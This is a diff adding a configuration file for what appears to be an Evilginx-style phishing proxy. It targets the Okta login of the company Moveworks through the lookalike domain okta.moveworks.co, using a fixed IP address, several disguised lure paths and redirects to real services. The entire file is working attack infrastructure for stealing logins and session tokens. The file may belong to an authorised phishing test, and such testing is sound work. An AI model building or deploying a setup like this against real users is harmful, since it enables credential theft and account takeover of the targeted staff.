@@ -1,0 +1,116 @@
+blacklist_mode: "off"
+ip: 3.80.70.47
+lures:
+- hostname: ""
+  path: /JaNuxUgl
+  redirect_url: https://www.google.com
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
+  path: /sypuwbPa
+  redirect_url: ""
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
+  path: /
+  redirect_url: https://docs.google.com/document/d/1hi-rSGcsQDdOFJ3CKA0YrCtibaLpJjlDbrMuFv0cID8/edit
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
+  path: /enduser/report-suspicious-activity
+  redirect_url: https://moveworks.okta.com/app/UserHome
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
+  path: /app/UserHome
+  redirect_url: https://moveworks.okta.com/app/UserHome
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
+  path: /auth
+  redirect_url: https://docs.google.com/document/d/1LYzA2PjKpVqi1e9y63l5bztxgnR1sNYa3fkZNwMC-Do/edit
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
+  path: /asana
+  redirect_url: https://app.asana.com/
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+- hostname: ""
+  path: /FuIbKfVV
+  redirect_url: ""
+  phishlet: okta-mw
+  template: ""
+  ua_filter: ""
+  info: ""
+  og_title: ""
+  og_desc: ""
+  og_image: ""
+  og_url: ""
+redirect_key: ux
+redirect_url: https://www.youtube.com/watch?v=dQw4w9WgXcQ
+server: okta.moveworks.co
+site_domains:
+  amazon: ""
+  citrix: ""
+  facebook: ""
+  github: ""
+  instagram: ""
+  linkedin: ""
+  o365: ""
+  okta: ""
+  okta-mw: ""
+  okta-mw: okta.moveworks.co
+  onelogin: ""
+  outlook: ""
+  protonmail: ""
+  reddit: ""
+  twitter: ""
+  twitter-mobile: ""
+  wordpress: ""
+sites_enabled:
+- okta-mw
+verification_key: en
+verification_token: 46ed
